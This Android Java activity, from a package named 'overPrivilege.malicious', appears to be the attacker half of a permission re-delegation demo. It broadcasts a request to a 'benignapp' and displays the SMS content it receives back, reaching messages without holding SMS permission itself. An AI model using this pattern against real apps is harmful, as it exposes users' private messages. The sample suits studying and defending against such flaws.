package overPrivilege.malicious;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import com.malicious.R;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MaliciousAppMainActivity";

    private BroadcastReceiver smsReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            Log.d(TAG, "Broadcast received");
            if ("com.benignapp.SMS_DATA".equals(intent.getAction())) {
                String smsData = intent.getStringExtra("sms_data");
                TextView smsTextView = findViewById(R.id.smsTextView);
                smsTextView.setText(smsData);
                Log.d(TAG, "SMS data set in TextView");
            } else {
                Log.d(TAG, "Received an unrelated intent");
            }
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Log.d(TAG, "MainActivity onCreate");
        // Envoyer une intention de requête à Benign App
        requestSmsData();
        // Enregistrer le BroadcastReceiver
        IntentFilter filter = new IntentFilter("com.benignapp.SMS_DATA");
        registerReceiver(smsReceiver, filter);
        Log.d(TAG, "BroadcastReceiver registered");
    }
    private void requestSmsData() {
        Intent requestIntent = new Intent("com.benignapp.REQUEST_SMS_DATA");
        sendBroadcast(requestIntent);
    }
    @Override
    protected void onDestroy() {
        super.onDestroy();

        // Désenregistrer le BroadcastReceiver
        unregisterReceiver(smsReceiver);
        Log.d(TAG, "BroadcastReceiver unregistered");
    }
}
